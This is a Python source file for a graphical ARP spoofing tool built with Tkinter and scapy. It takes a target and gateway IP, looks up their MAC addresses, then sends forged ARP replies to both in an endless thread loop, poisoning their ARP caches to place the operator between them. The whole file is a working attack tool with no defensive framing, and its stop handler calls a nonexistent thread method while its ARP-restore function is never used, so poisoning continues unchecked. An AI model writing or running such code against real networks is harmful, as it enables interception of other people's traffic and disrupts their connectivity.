# GUI VERSION OF ARP SPOOFER
from tkinter import *
from tkinter import messagebox
import threading
from scapy.all import *

class App:
    def __init__(self, master):
        self.master = master
        master.title("ARP SPOOFER")
        master.geometry("600x400")

        
        bg_color = "#2C3E50"
        label_color = "#ECF0F1"
        button_color = "#3498DB"

      
        self.master.config(bg=bg_color)

        
        self.target_label = Label(master, text="Target IP:", font=("Helvetica", 16), bg=bg_color, fg=label_color)
        self.target_label.grid(row=0, column=0, padx=10, pady=10)
        self.target_entry = Entry(master, width=30, font=("Helvetica", 16))
        self.target_entry.grid(row=0, column=1, padx=10, pady=10)

        self.gateway_label = Label(master, text="Gateway IP:", font=("Helvetica", 16), bg=bg_color, fg=label_color)
        self.gateway_label.grid(row=1, column=0, padx=10, pady=10)
        self.gateway_entry = Entry(master, width=30, font=("Helvetica", 16))
        self.gateway_entry.grid(row=1, column=1, padx=10, pady=10)

       
        self.start_button = Button(master, text="Start", font=("Helvetica", 16), bg=button_color, fg=label_color, command=self.strt_spoof)
        self.start_button.grid(row=2, column=0, padx=10, pady=10)

        self.stop_button = Button(master, text="Stop", font=("Helvetica", 16), bg=button_color, fg=label_color, command=self.stp_spoof, state=DISABLED)
        self.stop_button.grid(row=2, column=1, padx=10, pady=10)

     
        self.start_button.config(highlightbackground=label_color, highlightcolor=label_color)
        self.stop_button.config(highlightbackground=label_color, highlightcolor=label_color)
        
    def getmac(self,trgtip):
        arppac= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=trgtip)
        trgtmac= srp(arppac, timeout=2 , verbose= False)[0][0][1].hwsrc
        return trgtmac

    def strt_spoof(self):
        
        trgt_ip = self.target_entry.get()
        gateway_ip = self.gateway_entry.get()

        self.start_button.config(state=DISABLED)
        self.stop_button.config(state=NORMAL)

        try:
        
            trgt_mac = self.getmac(trgt_ip).upper()
            gateway_mac = self.getmac(gateway_ip).upper()
        except Exception as e:
            print (" EXCEPTION --> ",e)
            
            messagebox.showerror("Error", "Target or gateway machine is unreachable")
            self.stp_spoof()
            return

        self.spoof_thread = threading.Thread(target=self.spoof_arps, args=(trgt_ip, trgt_mac, gateway_ip, gateway_mac))
        self.spoof_thread.start()

    def stp_spoof(self):
      
        if hasattr(self, 'spoof_thread'):
            self.spoof_thread.stop()

        self.start_button.config(state=NORMAL)
        self.stop_button.config(state=DISABLED)
	
    def spoofarpcache(self,trgtip, trgtmac, sourceip):
        spoofed= ARP(op=2 , pdst=trgtip, psrc=sourceip, hwdst= trgtmac)
        send(spoofed, verbose= False)

    def restorearp(self,trgtip, trgtmac, srcip, srcmac):
        pckt= ARP(op=2 , hwsrc=srcmac , psrc= srcip, hwdst= trgtmac , pdst= trgtip)
        send(pckt, verbose=False)
        print ("ARP Table restored to normal for", trgtip)
	
    def spoof_arps(self, trgt_ip, trgt_mac, gateway_ip, gateway_mac):

        while True:
            self.spoofarpcache(trgt_ip, trgt_mac, gateway_ip)
            self.spoofarpcache(gateway_ip, gateway_mac, trgt_ip)
        	
root = Tk()
app = App(root)
root.mainloop()